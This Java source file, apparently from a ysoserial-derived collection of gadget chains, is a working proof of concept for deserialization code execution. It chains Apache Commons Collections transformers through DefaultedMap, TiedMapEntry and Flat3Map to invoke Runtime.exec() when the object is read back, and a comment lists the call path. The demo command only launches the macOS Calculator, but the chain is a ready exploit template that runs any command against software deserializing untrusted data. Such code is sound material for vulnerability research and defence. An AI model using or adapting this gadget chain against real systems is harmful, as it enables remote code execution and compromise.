package ysoserial.payloads.tabbyGadgetChains.CommonCollections3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.commons.collections.map.Flat3Map;

import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;


/**
 * readObject:1003, Flat3Map (org.apache.commons.collections.map)
 * put:325, Flat3Map (org.apache.commons.collections.map)
 * hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)
 * getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)
 * get:187, DefaultedMap (org.apache.commons.collections.map)
 * transform:123, ChainedTransformer (org.apache.commons.collections.functors)
 * method.invoke()
 */

public class CC3_Poc9 {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, ClassNotFoundException {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"" +
                        "/Applications/Calculator.app/Contents/MacOS/Calculator"})});
        HashMap innermap = new HashMap();
        DefaultedMap outerMap = (DefaultedMap)DefaultedMap.decorate(innermap,chain);
        TiedMapEntry tiedmap = new TiedMapEntry(outerMap,123);
        Flat3Map flat3Map = new Flat3Map(outerMap);
        flat3Map.put(tiedmap,"1");
        outerMap.remove(123);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccf3"));
        outputStream.writeObject(flat3Map);
        outputStream.close();


        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccf3"));
        inputStream.readObject();

    }
}
